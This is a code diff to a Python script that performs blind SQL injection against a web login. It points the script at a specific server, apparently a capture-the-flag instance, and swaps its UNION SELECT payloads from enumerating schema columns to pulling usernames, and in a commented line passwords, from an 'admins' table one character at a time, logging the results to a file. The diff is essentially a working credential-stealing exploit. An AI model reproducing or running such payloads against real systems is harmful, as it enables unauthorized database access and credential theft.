@@ -4,17 +4,18 @@ from requests import *
 import datetime
 
 
-server = ""
+server = "http://35.227.24.107:5001/cce7e41ce2"
 
 invalid_username = "Invalid username"
 invalid_password = "Invalid password"
 
 
+f = open("sql_output.txt", "a")
+
 def w(c):
 	f.write(c)
 	f.flush()
 
-f = open("sql_output.txt", "a")
 w("\n\n----------%s----------\n" % datetime.datetime.now())
 
 total = ""
@@ -22,7 +23,9 @@ total = ""
 for column in range(0, 100):
 	a = 1
 	while a < 10000:
-		SQL = "' UNION SELECT SUBSTR(COLUMN_NAME, %d,1) as name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'pages' LIMIT 1 OFFSET %d -- " % (a, column)
+		#SQL = "' UNION SELECT SUBSTR(COLUMN_NAME, %d,1) as name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'pages' LIMIT 1 OFFSET %d -- " % (a, column)
+		SQL = "' UNION SELECT SUBSTR(username, %d,1) FROM admins LIMIT 1 OFFSET %d -- " % (a, column)
+		#SQL = "' UNION SELECT SUBSTR(password, %d,1) FROM admins LIMIT 1 OFFSET %d -- " % (a, column)
 		#print(SQL)
 
 		
